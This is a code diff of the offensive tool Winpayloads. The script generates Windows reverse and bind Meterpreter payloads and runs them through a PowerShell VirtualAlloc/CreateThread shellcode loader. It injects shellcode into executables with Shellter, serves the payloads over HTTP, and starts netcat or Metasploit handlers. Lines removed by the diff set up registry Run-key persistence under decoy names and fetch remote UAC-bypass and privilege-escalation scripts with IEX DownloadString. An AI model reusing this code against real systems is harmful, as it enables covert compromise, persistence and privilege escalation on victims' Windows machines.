@@ -1,8 +1,9 @@
 #!/usr/bin/python
 from main import *
+from payloadextras import *
 
 
-if not re.search('winpayloads',os.getcwd().lower()):
+if not re.search('winpayloads', os.getcwd().lower()):
     print t.bold_red + "[!!] Please Run From Winpayloads Dir" + t.normal
     sys.exit(1)
 
@@ -14,35 +15,16 @@ try:
 except:
     iperror = True
 
-payload, payloadchoice, payloaddir, ez2read_shellcode, nullbytecount, ez2read_shellcode2, want_UACBYPASS, want_ALLCHECKS, want_PERSISTENCE, payloadname, iphex = '', '', '/etc/winpayloads', '', 0, '', 'n', 'n', 'n' , '', ''
+payload, payloadchoice, payloaddir, ez2read_shellcode, nullbytecount, ez2read_shellcode2, want_UACBYPASS, want_ALLCHECKS, want_PERSISTENCE, payloadname, iphex = '', '', '/etc/winpayloads', '', 0, '', 'n', 'n', 'n', '', ''
 
 try:
     os.mkdir(payloaddir)
 except OSError:
     pass
 
-print t.clear
-print '=' * t.width + t.bold_red
-print " _       ___       ____              __                __".center(t.width)
-print "   | |     / (_)___  / __ \____ ___  __/ /___  ____ _____/ /____".center(t.width)
-print "   | | /| / / / __ \/ /_/ / __ `/ / / / / __ \/ __ `/ __  / ___/".center(t.width)
-print "  | |/ |/ / / / / / ____/ /_/ / /_/ / / /_/ / /_/ / /_/ (__  )".center(t.width)
-print "  |__/|__/_/_/ /_/_/    \__,_/\__, /_/\____/\__,_/\__,_/____/".center(t.width)
-print "   /____/".center(t.width)
-print t.normal + '=' * t.width
-
+SHELLCODE().MENU()
 
 try:
-    print ('[1] Windows Reverse Shell' + t.bold_green + '(Stageless)' +
-           t.bold_red + ' [Shellter]').center(t.width - 44) + t.normal
-    print ('[2] Windows Reverse Meterpreter' + t.bold_green + '(Staged)' + t.bold_red +
-           ' [Shellter, UacBypass, Priv Esc Checks, Persistence]').center(t.width) + t.normal
-    print ('[3] Windows Bind Meterpreter' + t.bold_green + '(Staged)' + t.bold_red +
-           ' [Shellter, UacBypass, Priv Esc Checks, Persistence]').center(t.width - 4) + t.normal
-    print ('[4] Windows Reverse Meterpreter HTTPS' + t.bold_green + '(Staged)' +
-           t.bold_red + ' []').center(t.width - 30) + t.normal
-    print '=' * t.width
-
     while True:
         menuchoice = raw_input('> ')
         if menuchoice == '1':
@@ -88,7 +70,8 @@ try:
                 iphex = ipaddr
             else:
                 ip1, ip2, ip3, ip4 = ipaddr.split('.')
-                iphex = struct.pack('BBBB', int(ip1), int(ip2), int(ip3), int(ip4))
+                iphex = struct.pack('BBBB', int(
+                    ip1), int(ip2), int(ip3), int(ip4))
         except:
             print t.bold_red + '[*] Error in IP Syntax'
             sys.exit(1)
@@ -141,7 +124,7 @@ try:
             newpayloadlayout += char
             if count == 4:
                 newpayloadlayout += ','
-                count = 0l
+                count = 0
 
     if want_UACBYPASS.lower() == 'y':
         for byte in shellcode2:
@@ -160,49 +143,26 @@ try:
         persistencelayout)
     persistencenosleep = """$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-enc ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % (
         persistencelayout)
-    persistencerc = """run post/windows/manage/smart_migrate\nrun post/windows/manage/exec_powershell SCRIPT=persist.ps1 SESSION=1"""
 
     if want_PERSISTENCE.lower() == 'y':
-        with open('persist.ps1', 'w') as persistfile:
-            persistfile.write("""$persist = 'New-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -PropertyType String -Value "`"$($Env:SystemRoot)\System32\WindowsPowerShell\\v1.0\powershell.exe`\" -exec bypass -NonInteractive -WindowStyle Hidden -enc """ +
-                              base64.b64encode(persistencesleep.encode('utf_16_le')) + '\"\'; iex $persist; echo $persist > \"$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsPrintService.ps1\"')
-            persistfile.close()
-        with open('persist.rc', 'w') as persistfilerc:
-            persistfilerc.write(persistencerc)
-            persistfilerc.close()
+        EXTRAS().PERSISTENCE(persistencesleep)
+
+    if want_UACBYPASS.lower() == 'y':
+        EXTRAS().UACBYPASS(persistencenosleep)
+
+    if want_ALLCHECKS.lower() == 'y':
+        EXTRAS().ALLCHECKS()
 
     want_to_payloadinexe = raw_input(
         t.bold_red + '[*] Inject Shellcode Into an EXE (Shellter)? y/[n]: ' + t.normal)
 
-    if menuchoice == '2' or menuchoice == '3':
-        if want_UACBYPASS.lower() == 'y':
-            uacbypassrcfilecontents = """run post/windows/manage/migrate SESSION=1 NAME=explorer.exe SPAWN=false KILL=false\nrun post/windows/manage/exec_powershell SCRIPT=bypassuac.ps1 SESSION=1"""
-            uacbypassrcfilecontents2 = """run post/windows/manage/migrate SESSION=2 NAME=spoolsv.exe SPAWN=false KILL=false\nrun post/windows/escalate/getsystem SESSION=2"""
-            uacbypassfilecontent = """IEX (New-Object Net.WebClient).DownloadString("https://github.com/PowerShellEmpire/Empire/raw/master/data/module_source/privesc/Invoke-BypassUAC.ps1");\nInvoke-BypassUAC -Command \"powershell -enc %s\" """ % (
-                base64.b64encode(persistencenosleep.encode('utf_16_le')))
-            with open('bypassuac.ps1', 'w') as uacbypassfile:
-                uacbypassfile.write(uacbypassfilecontent)
-                uacbypassfile.close()
-            with open('uacbypass.rc', 'w') as uacbypassfilerc:
-                uacbypassfilerc.write(uacbypassrcfilecontents)
-                uacbypassfilerc.close()
-            with open('uacbypass2.rc', 'w') as uacbypassfilerc2:
-                uacbypassfilerc2.write(uacbypassrcfilecontents2)
-                uacbypassfilerc2.close()
-
-    if want_ALLCHECKS.lower() == 'y':
-        with open('allchecks.ps1', 'w') as allchecksfile:
-            allchecksfile.write(
-                """IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1");invoke-allchecks""")
-            allchecksfile.close()
-
     if not want_to_payloadinexe == 'y':
         with open('%s/payload.py' % payloaddir, 'w+') as Filesave:
-            Filesave.write(FUNCTIONS().DoPyCipher(SHELLCODE.injectwindows%(ez2read_shellcode)))
+            Filesave.write(FUNCTIONS().DoPyCipher(
+                SHELLCODE.injectwindows % (ez2read_shellcode)))
             Filesave.close()
 
         print '[*] Creating Payload using Pyinstaller...'
-
         subprocess.call(['wine', '/root/.wine/drive_c/Python27/python.exe', '/opt/pyinstaller-2.0/pyinstaller.py',
                          '%s/payload.py' % payloaddir, '--noconsole', '-F', '-y', '-o', payloaddir], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         print '[*] Cleaning Up...'
@@ -231,7 +191,7 @@ try:
         os.system('rm %s/build -r' % payloaddir)
         os.system('rm %s/*.spec' % payloaddir)
         os.system('rm %s/payload.py' % payloaddir)
-        print '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s' %(payloaddir, payloadname) + t.normal
+        print '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s' % (payloaddir, payloadname) + t.normal
 
     if want_to_payloadinexe.lower() == 'y':
         payloadinexe_payloadname = raw_input(
@@ -244,8 +204,9 @@ try:
         with open('payloadbin', 'wb') as Csave:
             Csave.write(shellcode)
             Csave.close()
-        payloadinexe_payloadnameshort = re.search('\w+\.exe$', payloadinexe_payloadname)
-        if re.search('(http:\/\/|https:\/\/)',payloadinexe_payloadname):
+        payloadinexe_payloadnameshort = re.search(
+            '\w+\.exe$', payloadinexe_payloadname)
+        if re.search('(http:\/\/|https:\/\/)', payloadinexe_payloadname):
             os.system('wget ' + payloadinexe_payloadname)
             payloadinexe_payloadname = payloadinexe_payloadnameshort.group(0)
         os.system('wine shellter.exe -a -f %s -s -p payloadbin ' %
@@ -269,7 +230,7 @@ try:
             a.daemon = True
             a.start()
         elif want_to_payloadinexe == 'n' and want_to_upload.lower() == 'y' or want_to_payloadinexe == '' and want_to_upload.lower() == '':
-            print t.bold_green + "\n[*] Serving Payload On http://%s:8000/%s"% (IP,payloadname) + t.normal
+            print t.bold_green + "\n[*] Serving Payload On http://%s:8000/%s" % (IP, payloadname) + t.normal
             a = multiprocessing.Process(
                 target=FUNCTIONS().ServePayload, args=(payloaddir,))
             a.daemon = True
@@ -301,7 +262,6 @@ try:
         b.daemon = True
         b.start()
 
-
     if menuchoice == '1':
         os.system('nc -lvp %s' % portnum)
     elif menuchoice == '2':
@@ -312,20 +272,20 @@ try:
         elif want_PERSISTENCE.lower() == 'y':
             os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript multi_console_command -rc persist.rc;set ExitOnSession false;exploit -j\'' % portnum)
         else:
-            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set ExitOnSession false;exploit -j\'' % portnum)
+            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set ExitOnSession false;set autorunscript post/windows/manage/priv_migrate;exploit -j\'' % portnum)
     elif menuchoice == '3':
         bindip = raw_input(
-            '\n[*] Enter Target Ip Address \n[*] IP> ')
+            '\n[*] Target Bind IP Address \n[*] IP> ')
         if want_UACBYPASS.lower() == 'y':
             os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set autorunscript multi_console_command -rc uacbypass.rc;set ExitOnSession false;exploit -j;set LPORT %s;set autorunscript multi_console_command -rc uacbypass2.rc;exploit -j\'' % (bindport, bindip, bindport + 1))
         elif want_ALLCHECKS.lower() == 'y':
             os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set autorunscript post/windows/manage/exec_powershell SCRIPT=allchecks.ps1;set ExitOnSession false;exploit -j\'' % (bindport, bindip))
         elif want_PERSISTENCE.lower() == 'y':
-            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set autorunscript set autorunscript multi_console_command -rc persist.rc;set ExitOnSession false;exploit -j\'' % (bindport, bindip))
+            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set autorunscript multi_console_command -rc persist.rc;set ExitOnSession false;exploit -j\'' % (bindport, bindip))
         else:
-            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set ExitOnSession false;exploit -j \'' % (bindport, bindip))
+            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set ExitOnSession false;set autorunscript post/windows/manage/priv_migrate;exploit -j \'' % (bindport, bindip))
     elif menuchoice == '4':
-        os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_https;set LPORT %s;set LHOST 0.0.0.0;set ExitOnSession false;exploit -j\'' % portnum)
+        os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_https;set LPORT %s;set LHOST 0.0.0.0;set ExitOnSession false;set autorunscript post/windows/manage/priv_migrate;exploit -j\'' % portnum)
 
     print t.bold_green + '[*] Cleaning Up\n' + t.normal
     subprocess.call(['rm *.rc'], shell=True,
